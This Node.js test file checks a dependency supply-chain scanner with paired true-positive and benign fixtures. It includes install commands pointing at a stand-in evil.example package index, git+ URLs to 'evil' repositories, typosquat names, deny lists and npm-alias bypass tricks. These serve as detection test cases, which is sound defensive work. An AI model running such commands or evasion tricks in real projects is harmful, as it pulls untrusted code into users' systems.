// selftest-deps.mjs — fixture-based tests for the dependency / supply-chain scanner.
// Exercises the PURE functions of deps.mjs only (no attestation, no real scanner
// required). Every metadata finding kind has a TRUE POSITIVE and a BENIGN
// NEAR-MISS that must NOT fire. Run: node selftest-deps.mjs

import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  compileDepsPolicy,
  parseManifests,
  parseManifestFile,
  scanDependencyMetadata,
  depsDecision,
  resolveTransitive,
  runVulnScanner,
  osvSeverityBand,
  cvssScore,
} from "./deps.mjs";

let fail = 0;
const ok = (name, cond) => { console.log(`${cond ? "PASS" : "FAIL"}  ${name}`); if (!cond) fail++; };

const dir = mkdtempSync(join(tmpdir(), "agt-deps-"));
const write = (name, body) => { const p = join(dir, name); writeFileSync(p, body); return p; };
// Write a file with its CANONICAL basename into a fresh sub-directory, so dispatch
// by basename (package.json / pyproject.toml / …) is exercised correctly even when
// two fixtures share a basename.
import { mkdirSync } from "node:fs";
let subN = 0;
const writeCanon = (name, body) => {
  const sub = join(dir, `case-${subN++}`);
  mkdirSync(sub, { recursive: true });
  const p = join(sub, name);
  writeFileSync(p, body);
  return p;
};
const hasKind = (findings, kind) => findings.some((f) => f.kind === kind);
const hasPkg = (findings, kind, pkg) => findings.some((f) => f.kind === kind && String(f.package).toLowerCase() === pkg.toLowerCase());

const advisory = compileDepsPolicy({ enabled: true, mode: "advisory" });
const pinned = compileDepsPolicy({ enabled: true, mode: "enforce", requirePinned: true });

try {
  // ── PARSING: requirements.txt ──────────────────────────────────────────────
  const reqPath = write("requirements.txt", [
    "# a comment",
    "requests==2.31.0",
    "flask>=2.0  # inline comment",
    "",
    "-r other.txt",
    "git+https://github.com/evil/pkg.git#egg=pkg",
  ].join("\n"));
  const reqSpecs = parseManifestFile(reqPath);
  ok("requirements: parses pinned + ranged specs",
    reqSpecs.some((s) => s.name === "requests" && /==2\.31\.0/.test(s.spec)) &&
    reqSpecs.some((s) => s.name === "flask"));
  ok("requirements: comment lines ignored",
    !reqSpecs.some((s) => /comment/i.test(s.name)));
  ok("requirements: ecosystem tagged pypi",
    reqSpecs.every((s) => s.ecosystem === "pypi"));

  // ── PARSING: pyproject.toml ────────────────────────────────────────────────
  const pyprojPath = write("pyproject.toml", [
    "[project]",
    'name = "demo"',
    "dependencies = [",
    '  "numpy>=1.24",',
    '  "pandas==2.0.0",',
    "]",
    "",
    "[project.optional-dependencies]",
    'dev = ["pytest==7.0", "black"]',
  ].join("\n"));
  const pyproj = parseManifestFile(pyprojPath);
  ok("pyproject: [project].dependencies parsed",
    pyproj.some((s) => s.name === "numpy") && pyproj.some((s) => s.name === "pandas"));
  ok("pyproject: optional-dependencies parsed",
    pyproj.some((s) => s.name === "pytest") && pyproj.some((s) => s.name === "black"));

  // ── PARSING: package.json (deps + devDeps + install script) ────────────────
  const pkgPath = write("package.json", JSON.stringify({
    name: "demo",
    dependencies: { lodash: "^4.17.21", "left-pad": "1.3.0" },
    devDependencies: { jest: "29.0.0" },
    scripts: { postinstall: "node ./scripts/fetch.js", build: "tsc" },
  }, null, 2));
  const pkg = parseManifestFile(pkgPath);
  ok("package.json: dependencies parsed",
    pkg.some((s) => s.name === "lodash") && pkg.some((s) => s.name === "left-pad"));
  ok("package.json: devDependencies parsed",
    pkg.some((s) => s.name === "jest"));
  ok("package.json: ecosystem tagged npm",
    pkg.filter((s) => !String(s.source).startsWith("script:")).every((s) => s.ecosystem === "npm"));
  ok("package.json: postinstall script surfaced as synthetic spec",
    pkg.some((s) => s.source === "script:postinstall"));
  ok("package.json: benign build script NOT surfaced",
    !pkg.some((s) => s.source === "script:build"));

  // ── PARSING: package-lock.json ─────────────────────────────────────────────
  const lockPath = write("package-lock.json", JSON.stringify({
    name: "demo", lockfileVersion: 3,
    packages: {
      "": { name: "demo" },
      "node_modules/lodash": { version: "4.17.21" },
      "node_modules/chalk": { version: "5.3.0" },
    },
  }, null, 2));
  const lock = parseManifestFile(lockPath);
  ok("package-lock: resolved versions parsed",
    lock.some((s) => s.name === "lodash" && /4\.17\.21/.test(s.spec)) &&
    lock.some((s) => s.name === "chalk"));

  // ── PARSING: uv.lock ───────────────────────────────────────────────────────
  const uvLockPath = write("uv.lock", [
    "[[package]]",
    'name = "requests"',
    'version = "2.31.0"',
    "",
    "[[package]]",
    'name = "urllib3"',
    'version = "2.0.7"',
  ].join("\n"));
  const uvLock = parseManifestFile(uvLockPath);
  ok("uv.lock: name/version pairs parsed",
    uvLock.some((s) => s.name === "requests" && /==2\.31\.0/.test(s.spec)) &&
    uvLock.some((s) => s.name === "urllib3"));

  // ── PARSING: PEP 723 inline block in a .py target ──────────────────────────
  const pep723Body = [
    "# /// script",
    "# requires-python = \">=3.11\"",
    "# dependencies = [",
    "#   \"requests<3\",",
    "#   \"rich>=13\",",
    "# ]",
    "# ///",
    "",
    "import requests",
    "print('hi')",
  ].join("\n");
  const scriptPath = write("script.py", pep723Body);
  const pep = parseManifestFile(scriptPath);
  ok("pep723: inline dependencies parsed from .py",
    pep.some((s) => s.name === "requests") && pep.some((s) => s.name === "rich"));
  // …and via the command path (uv run script.py).
  const pepFromCmd = parseManifests({ command: `uv run ${scriptPath}`, cwd: dir });
  ok("pep723: reachable via 'uv run script.py' command",
    pepFromCmd.some((s) => s.name === "rich"));

  // ── PARSING: inline command install args ───────────────────────────────────
  const pipCmd = parseManifests({ command: "pip install requests flask==2.0", cwd: dir });
  ok("command: 'pip install pkgs' parsed",
    pipCmd.some((s) => s.name === "requests") && pipCmd.some((s) => s.name === "flask"));
  const uvWith = parseManifests({ command: "uv run --with rich script.py", cwd: dir });
  ok("command: 'uv run --with PKG' parsed",
    uvWith.some((s) => s.name === "rich"));
  const npmCmd = parseManifests({ command: "npm install left-pad axios", cwd: dir });
  ok("command: 'npm install pkgs' parsed",
    npmCmd.some((s) => s.name === "left-pad") && npmCmd.some((s) => s.ecosystem === "npm"));
  const pipR = parseManifests({ command: "pip install -r requirements.txt", cwd: dir });
  ok("command: 'pip install -r file' reads the requirements file",
    pipR.some((s) => s.name === "requests"));

  // ── METADATA: unpinned flagged, pinned not ─────────────────────────────────
  const mPinned = scanDependencyMetadata([{ ecosystem: "pypi", name: "requests", spec: "requests==2.31.0", source: "t" }], pinned);
  ok("metadata: exact-pinned pypi spec NOT flagged unpinned", !hasKind(mPinned, "unpinned"));
  const mUnpinned = scanDependencyMetadata([{ ecosystem: "pypi", name: "requests", spec: "requests>=2.0", source: "t" }], pinned);
  ok("metadata: ranged pypi spec flagged unpinned", hasKind(mUnpinned, "unpinned"));
  const mNpmRange = scanDependencyMetadata([{ ecosystem: "npm", name: "lodash", spec: "lodash@^4.17.21", source: "t" }], pinned);
  ok("metadata: caret npm range flagged unpinned", hasKind(mNpmRange, "unpinned"));
  const mNpmExact = scanDependencyMetadata([{ ecosystem: "npm", name: "lodash", spec: "lodash@4.17.21", source: "t" }], pinned);
  ok("metadata: exact npm version NOT flagged unpinned", !hasKind(mNpmExact, "unpinned"));

  // ── METADATA: typosquat caught, real package not ───────────────────────────
  const mSquat = scanDependencyMetadata([{ ecosystem: "pypi", name: "reqeusts", spec: "reqeusts", source: "t" }], advisory);
  ok("metadata: typosquat 'reqeusts' (≈requests) caught", hasPkg(mSquat, "typosquat", "reqeusts"));
  const mReal = scanDependencyMetadata([{ ecosystem: "pypi", name: "requests", spec: "requests==2.31.0", source: "t" }], advisory);
  ok("metadata: real package 'requests' NOT flagged typosquat", !hasKind(mReal, "typosquat"));
  const mNpmSquat = scanDependencyMetadata([{ ecosystem: "npm", name: "loadsh", spec: "loadsh@1.0.0", source: "t" }], advisory);
  ok("metadata: npm typosquat 'loadsh' (≈lodash) caught", hasPkg(mNpmSquat, "typosquat", "loadsh"));

  // ── METADATA: deny list ────────────────────────────────────────────────────
  const denyPol = compileDepsPolicy({ enabled: true, mode: "enforce", deny: ["evilpkg"] });
  const mDeny = scanDependencyMetadata([{ ecosystem: "pypi", name: "evilpkg", spec: "evilpkg==1.0", source: "t" }], denyPol);
  ok("metadata: denied package flagged", hasKind(mDeny, "denied-package"));
  const mAllow = scanDependencyMetadata([{ ecosystem: "pypi", name: "goodpkg", spec: "goodpkg==1.0", source: "t" }], denyPol);
  ok("metadata: non-denied package NOT flagged denied", !hasKind(mAllow, "denied-package"));

  // ── METADATA: git+ URL / non-registry source flagged ───────────────────────
  const mGit = scanDependencyMetadata([{ ecosystem: "pypi", name: "pkg", spec: "git+https://github.com/evil/pkg.git", source: "t" }], advisory);
  ok("metadata: git+ URL flagged non-registry", hasKind(mGit, "non-registry-source"));
  const mFile = scanDependencyMetadata([{ ecosystem: "npm", name: "local", spec: "local@file:../local", source: "t" }], advisory);
  ok("metadata: file: source flagged non-registry", hasKind(mFile, "non-registry-source"));
  const mPlain = scanDependencyMetadata([{ ecosystem: "npm", name: "lodash", spec: "lodash@4.17.21", source: "t" }], advisory);
  ok("metadata: plain registry spec NOT flagged non-registry", !hasKind(mPlain, "non-registry-source"));

  // ── METADATA: npm install/postinstall script flagged ───────────────────────
  const mScript = scanDependencyMetadata([{ ecosystem: "npm", name: "demo", spec: "node ./fetch.js", source: "script:postinstall" }], advisory);
  ok("metadata: postinstall script flagged install-script", hasKind(mScript, "install-script"));

  // ── METADATA: untrusted index URL guard ────────────────────────────────────
  const idxPol = compileDepsPolicy({ enabled: true, mode: "enforce", allowedIndexes: ["pypi.org"] });
  const mIdx = scanDependencyMetadata([], idxPol, { command: "pip install --index-url https://evil.example/simple foo" });
  ok("metadata: unapproved --index-url flagged untrusted-index", hasKind(mIdx, "untrusted-index"));
  const mIdxOk = scanDependencyMetadata([], idxPol, { command: "pip install --index-url https://pypi.org/simple foo" });
  ok("metadata: approved --index-url NOT flagged", !hasKind(mIdxOk, "untrusted-index"));

  // ── METADATA: license deny (when license info attached) ────────────────────
  const licPol = compileDepsPolicy({ enabled: true, mode: "advisory", deniedLicenses: ["gpl-3.0"] });
  const mLic = scanDependencyMetadata([{ ecosystem: "npm", name: "copyleft", spec: "copyleft@1.0.0", source: "t", license: "GPL-3.0" }], licPol);
  ok("metadata: denied license flagged", hasKind(mLic, "denied-license"));
  const mLicOk = scanDependencyMetadata([{ ecosystem: "npm", name: "mit", spec: "mit@1.0.0", source: "t", license: "MIT" }], licPol);
  ok("metadata: allowed license NOT flagged", !hasKind(mLicOk, "denied-license"));

  // ── DECISION mapping (mirrors dlpDecision) ─────────────────────────────────
  const highF = [{ kind: "typosquat", severity: "high", package: "reqeusts", detail: "x" }];
  const medF = [{ kind: "unpinned", severity: "medium", package: "x", detail: "x" }];
  ok("decision: advisory high → allow", depsDecision(highF, advisory).decision === "allow");
  ok("decision: enforce high (≥medium threshold) → deny", depsDecision(highF, pinned).decision === "deny");
  ok("decision: enforce medium (=threshold) → deny", depsDecision(medF, pinned).decision === "deny");
  ok("decision: no findings → null", depsDecision([], pinned) === null);
  const lowThresh = compileDepsPolicy({ enabled: true, mode: "enforce", severityThreshold: "critical" });
  ok("decision: high below critical threshold → review", depsDecision(highF, lowThresh).decision === "review");

  // ── ROBUSTNESS: malformed + huge input must not throw ──────────────────────
  let threw = false;
  try {
    const badPkg = write("bad-package.json", "{ not valid json ,,,, ");
    parseManifestFile(badPkg);
    const badToml = write("bad.pyproject.toml", "[project\ndependencies = [unclosed");
    parseManifestFile(join(dir, "bad.pyproject.toml"));
    // Huge requirements file (bounded read must cap it).
    write("huge.requirements.txt", "requests==1.0\n".repeat(400000));
    parseManifestFile(join(dir, "huge.requirements.txt"));
    // Huge command.
    parseManifests({ command: "pip install " + "x".repeat(500000), cwd: dir });
    // Missing file.
    parseManifestFile(join(dir, "does-not-exist.txt"));
    // Null-ish inputs.
    parseManifests({});
    parseManifests({ command: null, cwd: null });
    scanDependencyMetadata(null, advisory);
    scanDependencyMetadata([{}], advisory);
    depsDecision(null, advisory);
  } catch (e) {
    threw = true;
    console.log("  threw:", e?.message);
  }
  ok("robustness: malformed / huge / missing input never throws", !threw);

  // Bad pyproject did not crash AND produced no garbage findings.
  const badPyproj = parseManifestFile(join(dir, "bad.pyproject.toml"));
  ok("robustness: malformed toml yields an array (no crash)", Array.isArray(badPyproj));

  // ── disabled policy ────────────────────────────────────────────────────────
  ok("disabled policy: compile returns null", compileDepsPolicy({ enabled: false }) === null);
  ok("disabled policy: scan with null policy → []",
    scanDependencyMetadata([{ ecosystem: "pypi", name: "reqeusts", spec: "reqeusts", source: "t" }], null).length === 0);

  // ════════════════════════════════════════════════════════════════════════════
  // ADVERSARIAL-PANEL REGRESSION TESTS (P1–P11 + scanner fidelity). Each asserts a
  // confirmed PoC is now caught AND a benign near-miss still does NOT fire.
  // ════════════════════════════════════════════════════════════════════════════

  // ── P1: npm alias `name@npm:realpkg@ver` checks the REAL target ─────────────
  const aliasDeny = compileDepsPolicy({ enabled: true, mode: "enforce", deny: ["evil"] });
  // command form: alias is harmless, target `evil` is denied
  const aliasCmd = parseManifests({ command: "npm install goodname@npm:evil@1.0.0", cwd: dir });
  ok("P1: npm alias command re-points name to the real aliased target",
    aliasCmd.some((s) => s.name === "evil" && s.aliasOf === "goodname"));
  ok("P1: npm alias denied target flagged (alias name would have slipped through)",
    hasKind(scanDependencyMetadata(aliasCmd, aliasDeny), "denied-package"));
  // package.json form: {"x": "npm:evil@1"}
  const aliasPkgPath = writeCanon("package.json", JSON.stringify({
    name: "demo", dependencies: { harmless: "npm:evil@1.0.0" },
  }));
  const aliasPkg = parseManifestFile(aliasPkgPath);
  ok("P1: package.json npm-alias range checks the real target",
    aliasPkg.some((s) => s.name === "evil" && s.aliasOf === "harmless") &&
    hasKind(scanDependencyMetadata(aliasPkg, aliasDeny), "denied-package"));

  // ── P2: extended lifecycle scripts (prepare/prepublish*/prestart) ──────────
  const lifePath = writeCanon("package.json", JSON.stringify({
    name: "demo",
    scripts: { prepare: "node a.js", prepublishOnly: "node b.js", prestart: "node c.js",
               build: "tsc", test: "jest" },
  }));
  const life = parseManifestFile(lifePath);
  ok("P2: prepare lifecycle script surfaced", life.some((s) => /^script:prepare$/i.test(s.source)));
  ok("P2: prepublishOnly lifecycle script surfaced (case-insensitive)",
    life.some((s) => /^script:prepublishonly$/i.test(s.source)));
  ok("P2: prestart lifecycle script surfaced", life.some((s) => /^script:prestart$/i.test(s.source)));
  ok("P2: benign build/test scripts NOT surfaced",
    !life.some((s) => /^script:(build|test)$/i.test(s.source)));
  ok("P2: extended lifecycle scripts flagged install-script",
    hasKind(scanDependencyMetadata(life, advisory), "install-script"));

  // ── P3: in-file editable VCS in requirements.txt ───────────────────────────
  const editPath = write("edit.requirements.txt", [
    "requests==2.31.0",
    "-e git+https://github.com/evil/pkg.git#egg=pkg",
    "--editable git+ssh://git@github.com/evil/other.git",
    "-e ./localpkg",
  ].join("\n"));
  const edit = parseManifestFile(editPath);
  ok("P3: '-e git+https' editable parsed (not dropped as a flag line)",
    edit.some((s) => /git\+https/.test(s.spec)));
  ok("P3: '--editable git+ssh' editable parsed",
    edit.some((s) => /git\+ssh/.test(s.spec)));
  ok("P3: editable VCS/local flagged non-registry",
    scanDependencyMetadata(edit, advisory).filter((f) => f.kind === "non-registry-source").length >= 2);

  // ── P4: PEP503 normalization on deny/allow (separators + case) ─────────────
  const p503Deny = compileDepsPolicy({ enabled: true, mode: "enforce", deny: ["evil-pkg"] });
  for (const variant of ["evil_pkg", "evil.pkg", "evil--pkg", "Evil-PKG"]) {
    ok(`P4: deny 'evil-pkg' catches PEP503 variant '${variant}'`,
      hasKind(scanDependencyMetadata([{ ecosystem: "pypi", name: variant, spec: `${variant}==1.0`, source: "t" }], p503Deny), "denied-package"));
  }
  ok("P4: unrelated package 'evilish' NOT caught by 'evil-pkg' deny",
    !hasKind(scanDependencyMetadata([{ ecosystem: "pypi", name: "evilish", spec: "evilish==1.0", source: "t" }], p503Deny), "denied-package"));

  // ── P5: env-var index + `npm config set registry` URL guard ────────────────
  const p5Pol = compileDepsPolicy({ enabled: true, mode: "enforce", allowedIndexes: ["pypi.org"] });
  ok("P5: PIP_INDEX_URL env var flagged untrusted-index",
    hasKind(scanDependencyMetadata([], p5Pol, { command: "PIP_INDEX_URL=https://evil.example/simple pip install foo" }), "untrusted-index"));
  ok("P5: UV_INDEX_URL env var flagged untrusted-index",
    hasKind(scanDependencyMetadata([], p5Pol, { command: "UV_INDEX_URL=https://evil.example/simple uv pip install foo" }), "untrusted-index"));
  ok("P5: npm_config_registry env var flagged untrusted-index",
    hasKind(scanDependencyMetadata([], p5Pol, { command: "npm_config_registry=https://evil.example/ npm install foo" }, ), "untrusted-index"));
  ok("P5: 'npm config set registry <url>' flagged untrusted-index",
    hasKind(scanDependencyMetadata([], p5Pol, { command: "npm config set registry https://evil.example/" }), "untrusted-index"));
  ok("P5: approved PIP_INDEX_URL NOT flagged",
    !hasKind(scanDependencyMetadata([], p5Pol, { command: "PIP_INDEX_URL=https://pypi.org/simple pip install foo" }), "untrusted-index"));

  // ── P6/P7: typosquat tuning — catch dist-2/affix/separator, spare real names ─
  const p6pypi = compileDepsPolicy({ enabled: true, mode: "advisory",
    popularPackages: { pypi: ["mongoose"] } });
  const p6npm = compileDepsPolicy({ enabled: true, mode: "advisory",
    popularPackages: { npm: ["cross-env", "mongoose", "vue"] } });
  ok("P6: 'python-requests' (affix-wrap of requests) caught",
    hasPkg(scanDependencyMetadata([{ ecosystem: "pypi", name: "python-requests", spec: "python-requests", source: "t" }], advisory), "typosquat", "python-requests"));
  ok("P6: 'crossenv' (separator-swap of cross-env) caught",
    hasPkg(scanDependencyMetadata([{ ecosystem: "npm", name: "crossenv", spec: "crossenv@1", source: "t" }], p6npm), "typosquat", "crossenv"));
  ok("P6: 'mongose' (≈mongoose) caught",
    hasPkg(scanDependencyMetadata([{ ecosystem: "pypi", name: "mongose", spec: "mongose", source: "t" }], p6pypi), "typosquat", "mongose"));
  // P7 false-positive guards: real short/near names must NOT fire
  ok("P7: real 'request' NOT flagged typosquat (vs requests)",
    !hasKind(scanDependencyMetadata([{ ecosystem: "pypi", name: "request", spec: "request==2.0", source: "t" }], advisory), "typosquat"));
  ok("P7: real 'urllib' NOT flagged typosquat (vs urllib3)",
    !hasKind(scanDependencyMetadata([{ ecosystem: "pypi", name: "urllib", spec: "urllib==1.0", source: "t" }], advisory), "typosquat"));
  ok("P7: real 'click' NOT flagged typosquat",
    !hasKind(scanDependencyMetadata([{ ecosystem: "pypi", name: "click", spec: "click==8.0", source: "t" }], advisory), "typosquat"));
  ok("P7: real 'vuex' NOT flagged typosquat (vs vue)",
    !hasKind(scanDependencyMetadata([{ ecosystem: "npm", name: "vuex", spec: "vuex@4", source: "t" }], p6npm), "typosquat"));

  // ── P8: pyproject [build-system].requires + poetry TABLE form ──────────────
  const p8Path = writeCanon("pyproject.toml", [
    "[build-system]",
    'requires = ["setuptools>=61", "cython==3.0.0"]',
    'build-backend = "setuptools.build_meta"',
    "",
    "[tool.poetry.dependencies]",
    'python = "^3.11"',
    'requests = "^2.31"',
    'pandas = "2.0.0"',
    "evilgit = { git = \"https://github.com/evil/x.git\" }",
    "",
    "[tool.poetry.group.dev.dependencies]",
    'pytest = "^7.0"',
  ].join("\n"));
  const p8 = parseManifestFile(p8Path);
  ok("P8: [build-system].requires parsed",
    p8.some((s) => s.name === "setuptools") && p8.some((s) => s.name === "cython"));
  ok("P8: poetry TABLE dependencies parsed",
    p8.some((s) => s.name === "requests") && p8.some((s) => s.name === "pandas"));
  ok("P8: poetry interpreter 'python' key skipped",
    !p8.some((s) => s.name === "python"));
  ok("P8: poetry dev-group dependencies parsed",
    p8.some((s) => s.name === "pytest"));
  ok("P8: poetry git inline-table flagged non-registry",
    hasKind(scanDependencyMetadata(p8, advisory), "non-registry-source"));

  // ── P9: parseManifests(null) / parseManifestFile(null) must not throw ──────
  let p9threw = false;
  let p9a, p9b;
  try { p9a = parseManifests(null); p9b = parseManifestFile(null); }
  catch { p9threw = true; }
  ok("P9: parseManifests(null)/parseManifestFile(null) return arrays, no throw",
    !p9threw && Array.isArray(p9a) && Array.isArray(p9b));

  // ── P10: MAX_SPECS truncation emits an explicit finding (not silent drop) ──
  const tooMany = [];
  for (let i = 0; i < 5001; i++) tooMany.push({ ecosystem: "pypi", name: `p${i}`, spec: `p${i}==1.0`, source: "t" });
  ok("P10: >MAX_SPECS input yields an analysis-truncated finding",
    hasKind(scanDependencyMetadata(tooMany, advisory), "analysis-truncated"));
  ok("P10: at-cap input does NOT emit truncation finding",
    !hasKind(scanDependencyMetadata(tooMany.slice(0, 10), advisory), "analysis-truncated"));

  // ── P11: PEP723 `#///` no-space tolerance + no bare-.txt dispatch ──────────
  const pep723NoSpace = write("nospace.py", [
    "#/// script",
    '# dependencies = ["requests<3", "rich"]',
    "#///",
    "print('hi')",
  ].join("\n"));
  const pepNoSpace = parseManifestFile(pep723NoSpace);
  ok("P11: PEP723 '#///' no-space markers tolerated",
    pepNoSpace.some((s) => s.name === "requests") && pepNoSpace.some((s) => s.name === "rich"));
  const notReq = write("notes.txt", "requests==2.31.0\nflask\n");
  ok("P11: a bare notes.txt is NOT parsed as requirements",
    parseManifestFile(notReq).length === 0);
  ok("P11: a real requirements-dev.txt IS still parsed",
    parseManifestFile(write("requirements-dev.txt", "pytest==7.0\n")).some((s) => s.name === "pytest"));

  // ── Scanner fidelity 13: osv CVSS-vector severity banding (no scanner needed) ─
  ok("osv-sev: CVSS:3.1 critical vector → critical",
    osvSeverityBand({ severity: [{ type: "CVSS_V3", score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }] }) === "critical");
  ok("osv-sev: CVSS:3.1 low vector → low",
    osvSeverityBand({ severity: [{ type: "CVSS_V3", score: "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:L" }] }) === "low");
  ok("osv-sev: no vector but database_specific HIGH → high",
    osvSeverityBand({ database_specific: { severity: "HIGH" } }) === "high");
  ok("osv-sev: no severity info at all → medium (not blanket-medium-by-default-for-V3)",
    osvSeverityBand({}) === "medium");
  ok("osv-sev: CVSS:4.0 high-impact vector → high or critical (not flat medium)",
    ["high", "critical"].includes(osvSeverityBand({ severity: [{ type: "CVSS_V4", score: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N" }] })));
  ok("cvss: 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H scores 9.8",
    Math.abs(cvssScore("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") - 9.8) < 0.05);
  ok("cvss: non-CVSS string → null", cvssScore("not-a-vector") === null);

  // ── Scanner fidelity 12/16: pip-audit needs -r; coverage/dbVersion fields ──
  // With NO scanner on PATH the result must still carry coverage:'unavailable'.
  const covMissing = await runVulnScanner([], { cwd: dir, scannerCmd: "definitely-not-real-xyz" });
  ok("coverage: missing scanner → coverage:'unavailable' + dbVersion null",
    covMissing.coverage === "unavailable" && covMissing.dbVersion === null);

  // ── TIER-2: transitive resolution (async, no scanner needed) ───────────────
  const resLock = await resolveTransitive([], { cwd: dir });
  ok("resolve: uses lockfile when present (fromLockfile)", resLock.fromLockfile === true && resLock.resolved.length > 0);
  const emptyDir = mkdtempSync(join(tmpdir(), "agt-deps-empty-"));
  try {
    const resNoLock = await resolveTransitive([{ ecosystem: "pypi", name: "requests", spec: "requests==2.0", source: "t" }], { cwd: emptyDir });
    ok("resolve: no lockfile → declared set + note", resNoLock.fromLockfile === false && typeof resNoLock.note === "string" && resNoLock.resolved.length === 1);
  } finally {
    rmSync(emptyDir, { recursive: true, force: true });
  }

  // ── TIER-2: scanner auto-detect degrades gracefully ────────────────────────
  // Force a scanner name that does not exist so probe fails regardless of host.
  const scanForced = await runVulnScanner([], { cwd: dir, scannerCmd: "definitely-not-a-real-scanner-xyz" });
  ok("scanner: forced-missing scanner → available:false, no throw, note present",
    scanForced.available === false && Array.isArray(scanForced.findings) && typeof scanForced.note === "string");
  // Auto-detect: do NOT require any scanner installed. Whatever the host has, the
  // result must be a well-formed object with a boolean `available` and an array
  // of findings — never an exception.
  const scanAuto = await runVulnScanner([], { cwd: dir });
  ok("scanner: auto-detect returns well-formed result (available bool + findings array)",
    typeof scanAuto.available === "boolean" && Array.isArray(scanAuto.findings));
  // Coverage/dbVersion are always present and consistent with availability.
  ok("scanner: result always carries a coverage field (unavailable|declared-only|full)",
    ["unavailable", "declared-only", "full"].includes(scanAuto.coverage));
  ok("scanner: unavailable scan reports coverage 'unavailable'",
    scanAuto.available || scanAuto.coverage === "unavailable");
  ok("scanner: dbVersion is a string or null",
    scanAuto.dbVersion === null || typeof scanAuto.dbVersion === "string");

} finally {
  rmSync(dir, { recursive: true, force: true });
}

console.log(`\n${fail === 0 ? "ALL PASS" : fail + " FAILED"}`);
process.exit(fail === 0 ? 0 : 1);
